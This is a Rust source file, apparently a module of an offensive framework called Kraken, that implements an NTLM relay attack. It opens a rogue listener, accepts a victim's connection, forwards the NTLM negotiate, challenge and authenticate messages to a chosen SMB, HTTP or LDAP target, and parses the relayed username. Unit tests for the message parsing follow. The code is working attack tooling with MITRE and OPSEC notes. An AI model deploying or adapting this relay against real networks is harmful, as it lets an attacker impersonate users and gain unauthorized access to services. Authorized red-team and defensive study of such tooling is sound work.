//! NTLM Relay — capture and relay NTLM authentication
//!
//! Sets up a rogue SMB/HTTP listener that captures NTLM authentication
//! attempts and relays them to a target service.
//!
//! ## MITRE ATT&CK
//! - T1557.001: LLMNR/NBT-NS Poisoning and SMB Relay
//!
//! ## OPSEC
//! - Creates a network listener (detectable)
//! - SMB signing must be disabled on target
//! - Relay is one-shot per authentication

use common::KrakenError;

#[cfg(windows)]
use std::io::{Read, Write};
#[cfg(windows)]
use std::net::{SocketAddr, TcpListener, TcpStream};
#[cfg(windows)]
use std::time::Duration;

/// NTLM message types
#[cfg(any(windows, test))]
const NTLM_NEGOTIATE: u32 = 1;
#[cfg(any(windows, test))]
const NTLM_CHALLENGE: u32 = 2;
#[cfg(any(windows, test))]
const NTLM_AUTHENTICATE: u32 = 3;

/// NTLM signature
#[cfg(any(windows, test))]
const NTLMSSP_SIGNATURE: &[u8; 8] = b"NTLMSSP\0";

/// Result of an NTLM relay attempt
#[derive(Debug)]
pub struct NtlmRelayResult {
    pub success: bool,
    pub relayed_user: String,
    pub target: String,
    pub result: String,
}

/// NTLM relay configuration
pub struct NtlmRelayConfig {
    pub listener_host: String,
    pub listener_port: u16,
    pub target_host: String,
    pub target_port: u16,
    pub target_protocol: RelayProtocol,
}

#[derive(Debug, Clone, Copy)]
pub enum RelayProtocol {
    Smb,
    Http,
    Ldap,
}

impl RelayProtocol {
    pub fn from_str(s: &str) -> Result<Self, KrakenError> {
        match s.to_lowercase().as_str() {
            "smb" => Ok(Self::Smb),
            "http" | "https" => Ok(Self::Http),
            "ldap" | "ldaps" => Ok(Self::Ldap),
            _ => Err(KrakenError::Module(format!(
                "unsupported relay protocol: {}",
                s
            ))),
        }
    }
}

/// Run NTLM relay: listen for incoming auth, relay to target
#[cfg(windows)]
pub fn relay(config: &NtlmRelayConfig) -> Result<NtlmRelayResult, KrakenError> {
    let bind_addr: SocketAddr = format!("{}:{}", config.listener_host, config.listener_port)
        .parse()
        .map_err(|e| KrakenError::Module(format!("invalid bind address: {}", e)))?;

    let listener = TcpListener::bind(bind_addr)
        .map_err(|e| KrakenError::Module(format!("bind failed: {}", e)))?;

    listener
        .set_nonblocking(false)
        .map_err(|e| KrakenError::Module(format!("set blocking: {}", e)))?;

    // Accept one connection (the victim)
    let (mut victim, victim_addr) = listener
        .accept()
        .map_err(|e| KrakenError::Module(format!("accept failed: {}", e)))?;

    victim
        .set_read_timeout(Some(Duration::from_secs(30)))
        .map_err(|e| KrakenError::Module(format!("set timeout: {}", e)))?;

    tracing::info!("NTLM relay: victim connected from {}", victim_addr);

    // Connect to the target
    let target_addr = format!("{}:{}", config.target_host, config.target_port);
    let mut target = TcpStream::connect(&target_addr)
        .map_err(|e| KrakenError::Module(format!("target connect failed: {}", e)))?;

    target
        .set_read_timeout(Some(Duration::from_secs(30)))
        .map_err(|e| KrakenError::Module(format!("set timeout: {}", e)))?;

    // Phase 1: Receive NEGOTIATE from victim
    let negotiate = read_ntlm_message(&mut victim)?;
    let username = extract_ntlm_username(&negotiate).unwrap_or_default();

    // Phase 2: Forward NEGOTIATE to target, get CHALLENGE
    send_ntlm_message(&mut target, &negotiate)?;
    let challenge = read_ntlm_message(&mut target)?;

    // Phase 3: Send CHALLENGE to victim, get AUTHENTICATE
    send_ntlm_message(&mut victim, &challenge)?;
    let authenticate = read_ntlm_message(&mut victim)?;

    let relayed_user = extract_ntlm_username(&authenticate).unwrap_or(username);

    // Phase 4: Forward AUTHENTICATE to target
    send_ntlm_message(&mut target, &authenticate)?;

    // Read target response to determine success
    let mut response_buf = [0u8; 4096];
    let n = target.read(&mut response_buf).unwrap_or(0);
    let success = n > 0; // Simplified: non-empty response = accepted

    Ok(NtlmRelayResult {
        success,
        relayed_user,
        target: target_addr,
        result: if success {
            format!("Authentication relayed ({} bytes response)", n)
        } else {
            "Relay failed or rejected".to_string()
        },
    })
}

#[cfg(not(windows))]
pub fn relay(_config: &NtlmRelayConfig) -> Result<NtlmRelayResult, KrakenError> {
    Err(KrakenError::Module(
        "NTLM relay only supported on Windows".into(),
    ))
}

/// Read an NTLM message from a stream (simplified SMB framing)
#[cfg(windows)]
fn read_ntlm_message(stream: &mut TcpStream) -> Result<Vec<u8>, KrakenError> {
    let mut buf = [0u8; 65536];
    let n = stream
        .read(&mut buf)
        .map_err(|e| KrakenError::Module(format!("read failed: {}", e)))?;
    if n == 0 {
        return Err(KrakenError::Module("connection closed".into()));
    }
    Ok(buf[..n].to_vec())
}

/// Send an NTLM message to a stream
#[cfg(windows)]
fn send_ntlm_message(stream: &mut TcpStream, data: &[u8]) -> Result<(), KrakenError> {
    stream
        .write_all(data)
        .map_err(|e| KrakenError::Module(format!("write failed: {}", e)))?;
    stream
        .flush()
        .map_err(|e| KrakenError::Module(format!("flush failed: {}", e)))?;
    Ok(())
}

/// Extract username from NTLM message (Type 3 AUTHENTICATE)
#[cfg(any(windows, test))]
fn extract_ntlm_username(data: &[u8]) -> Option<String> {
    // Find NTLMSSP signature
    let sig_pos = data.windows(8).position(|w| w == NTLMSSP_SIGNATURE)?;
    let ntlm_data = &data[sig_pos..];

    if ntlm_data.len() < 12 {
        return None;
    }

    // Check message type
    let msg_type = u32::from_le_bytes([ntlm_data[8], ntlm_data[9], ntlm_data[10], ntlm_data[11]]);

    if msg_type == NTLM_AUTHENTICATE && ntlm_data.len() >= 44 {
        // Type 3: Username at offset 36 (length at 36, max_length at 38, offset at 40)
        let user_len = u16::from_le_bytes([ntlm_data[36], ntlm_data[37]]) as usize;
        let user_offset =
            u32::from_le_bytes([ntlm_data[40], ntlm_data[41], ntlm_data[42], ntlm_data[43]])
                as usize;

        if user_offset + user_len <= ntlm_data.len() {
            // UTF-16LE encoded
            let user_bytes = &ntlm_data[user_offset..user_offset + user_len];
            let chars: Vec<u16> = user_bytes
                .chunks(2)
                .map(|c| u16::from_le_bytes([c[0], c.get(1).copied().unwrap_or(0)]))
                .collect();
            return String::from_utf16(&chars).ok();
        }
    }

    None
}

/// Extract domain from NTLM Type 3 (AUTHENTICATE) message
#[cfg(test)]
fn extract_ntlm_domain(data: &[u8]) -> Option<String> {
    let sig_pos = data.windows(8).position(|w| w == NTLMSSP_SIGNATURE)?;
    let ntlm_data = &data[sig_pos..];

    if ntlm_data.len() < 36 {
        return None;
    }

    let msg_type = u32::from_le_bytes([ntlm_data[8], ntlm_data[9], ntlm_data[10], ntlm_data[11]]);

    if msg_type == NTLM_AUTHENTICATE && ntlm_data.len() >= 36 {
        let domain_len = u16::from_le_bytes([ntlm_data[28], ntlm_data[29]]) as usize;
        let domain_offset =
            u32::from_le_bytes([ntlm_data[32], ntlm_data[33], ntlm_data[34], ntlm_data[35]])
                as usize;

        if domain_offset + domain_len <= ntlm_data.len() {
            let domain_bytes = &ntlm_data[domain_offset..domain_offset + domain_len];
            let chars: Vec<u16> = domain_bytes
                .chunks(2)
                .map(|c| u16::from_le_bytes([c[0], c.get(1).copied().unwrap_or(0)]))
                .collect();
            return String::from_utf16(&chars).ok();
        }
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    // Minimal NTLM Type 3 (AUTHENTICATE) message for testing.
    // Layout: NTLMSSP\0 + msg_type(4) + LmChallengeResponseFields(8)
    //   + NtChallengeResponseFields(8) + DomainNameFields(8) + UserNameFields(8) + ...
    // Offsets that matter:
    //   [8..12]  = MessageType (u32 LE) = 3
    //   [28..30] = DomainName.Len (u16 LE)
    //   [30..32] = DomainName.MaxLen (u16 LE)  (unused by our parser)
    //   [32..36] = DomainName.BufferOffset (u32 LE)
    //   [36..38] = UserName.Len (u16 LE)
    //   [38..40] = UserName.MaxLen (u16 LE)    (unused by our parser)
    //   [40..44] = UserName.BufferOffset (u32 LE)
    fn build_type3_message(domain: &str, username: &str) -> Vec<u8> {
        // Encode both as UTF-16LE
        let domain_utf16: Vec<u8> = domain
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        let user_utf16: Vec<u8> = username
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();

        // Fixed header is 72 bytes (standard NTLM Type 3 minimum before payload)
        let header_len: u32 = 72;
        let domain_offset = header_len;
        let user_offset = header_len + domain_utf16.len() as u32;

        let mut msg = vec![0u8; 72];

        // Signature
        msg[0..8].copy_from_slice(NTLMSSP_SIGNATURE);
        // MessageType = 3
        msg[8..12].copy_from_slice(&3u32.to_le_bytes());
        // LmChallengeResponseFields [12..20] — zeroed
        // NtChallengeResponseFields [20..28] — zeroed
        // DomainNameFields
        msg[28..30].copy_from_slice(&(domain_utf16.len() as u16).to_le_bytes());
        msg[30..32].copy_from_slice(&(domain_utf16.len() as u16).to_le_bytes());
        msg[32..36].copy_from_slice(&domain_offset.to_le_bytes());
        // UserNameFields
        msg[36..38].copy_from_slice(&(user_utf16.len() as u16).to_le_bytes());
        msg[38..40].copy_from_slice(&(user_utf16.len() as u16).to_le_bytes());
        msg[40..44].copy_from_slice(&user_offset.to_le_bytes());
        // WorkstationFields [44..52] — zeroed
        // EncryptedRandomSessionKeyFields [52..60] — zeroed
        // NegotiateFlags [60..64] — zeroed
        // Version [64..72] — zeroed

        msg.extend_from_slice(&domain_utf16);
        msg.extend_from_slice(&user_utf16);
        msg
    }

    #[test]
    fn test_ntlmssp_signature_detected() {
        let mut data = vec![0u8; 16];
        data[0..8].copy_from_slice(NTLMSSP_SIGNATURE);
        let pos = data.windows(8).position(|w| w == NTLMSSP_SIGNATURE);
        assert_eq!(pos, Some(0));
    }

    #[test]
    fn test_ntlmssp_signature_at_offset() {
        // Signature buried after some framing bytes
        let mut data = vec![0u8; 32];
        data[4..12].copy_from_slice(NTLMSSP_SIGNATURE);
        let pos = data.windows(8).position(|w| w == NTLMSSP_SIGNATURE);
        assert_eq!(pos, Some(4));
    }

    #[test]
    fn test_extract_ntlm_username_type3() {
        let msg = build_type3_message("WORKGROUP", "Administrator");
        let result = extract_ntlm_username(&msg);
        assert_eq!(result, Some("Administrator".to_string()));
    }

    #[test]
    fn test_extract_ntlm_username_empty() {
        let msg = build_type3_message("DOMAIN", "");
        let result = extract_ntlm_username(&msg);
        // Empty UTF-16 string decodes to empty String
        assert_eq!(result, Some(String::new()));
    }

    #[test]
    fn test_extract_ntlm_username_non_ascii() {
        let msg = build_type3_message("CORP", "jöhn");
        let result = extract_ntlm_username(&msg);
        assert_eq!(result, Some("jöhn".to_string()));
    }

    #[test]
    fn test_extract_ntlm_domain_type3() {
        let msg = build_type3_message("CONTOSO", "bob");
        let result = extract_ntlm_domain(&msg);
        assert_eq!(result, Some("CONTOSO".to_string()));
    }

    #[test]
    fn test_extract_ntlm_domain_empty_message() {
        let data: Vec<u8> = vec![];
        let result = extract_ntlm_domain(&data);
        assert!(result.is_none());
    }

    #[test]
    fn test_extract_ntlm_username_wrong_type() {
        // Build a Type 1 (NEGOTIATE) — should return None for username
        let mut msg = vec![0u8; 32];
        msg[0..8].copy_from_slice(NTLMSSP_SIGNATURE);
        msg[8..12].copy_from_slice(&(NTLM_NEGOTIATE).to_le_bytes());
        let result = extract_ntlm_username(&msg);
        assert!(result.is_none());
    }

    #[test]
    fn test_extract_ntlm_username_type2_challenge() {
        // Type 2 (CHALLENGE) — no username field, should return None
        let mut msg = vec![0u8; 48];
        msg[0..8].copy_from_slice(NTLMSSP_SIGNATURE);
        msg[8..12].copy_from_slice(&(NTLM_CHALLENGE).to_le_bytes());
        let result = extract_ntlm_username(&msg);
        assert!(result.is_none());
    }

    #[test]
    fn test_relay_protocol_from_str_smb() {
        let p = RelayProtocol::from_str("smb").unwrap();
        assert!(matches!(p, RelayProtocol::Smb));
    }

    #[test]
    fn test_relay_protocol_from_str_http() {
        let p = RelayProtocol::from_str("http").unwrap();
        assert!(matches!(p, RelayProtocol::Http));
    }

    #[test]
    fn test_relay_protocol_from_str_https() {
        let p = RelayProtocol::from_str("https").unwrap();
        assert!(matches!(p, RelayProtocol::Http));
    }

    #[test]
    fn test_relay_protocol_from_str_ldap() {
        let p = RelayProtocol::from_str("ldap").unwrap();
        assert!(matches!(p, RelayProtocol::Ldap));
    }

    #[test]
    fn test_relay_protocol_from_str_ldaps() {
        let p = RelayProtocol::from_str("ldaps").unwrap();
        assert!(matches!(p, RelayProtocol::Ldap));
    }

    #[test]
    fn test_relay_protocol_from_str_case_insensitive() {
        let p = RelayProtocol::from_str("SMB").unwrap();
        assert!(matches!(p, RelayProtocol::Smb));
    }

    #[test]
    fn test_relay_protocol_from_str_invalid() {
        let result = RelayProtocol::from_str("ftp");
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("unsupported relay protocol"));
    }

    #[test]
    fn test_ntlm_relay_config_construction() {
        let config = NtlmRelayConfig {
            listener_host: "0.0.0.0".to_string(),
            listener_port: 445,
            target_host: "192.168.1.100".to_string(),
            target_port: 445,
            target_protocol: RelayProtocol::Smb,
        };
        assert_eq!(config.listener_port, 445);
        assert_eq!(config.target_host, "192.168.1.100");
        assert!(matches!(config.target_protocol, RelayProtocol::Smb));
    }

    #[test]
    #[cfg(not(windows))]
    fn test_relay_unsupported_on_non_windows() {
        let config = NtlmRelayConfig {
            listener_host: "127.0.0.1".to_string(),
            listener_port: 9445,
            target_host: "127.0.0.1".to_string(),
            target_port: 445,
            target_protocol: RelayProtocol::Smb,
        };
        let result = relay(&config);
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("only supported on Windows"));
    }
}
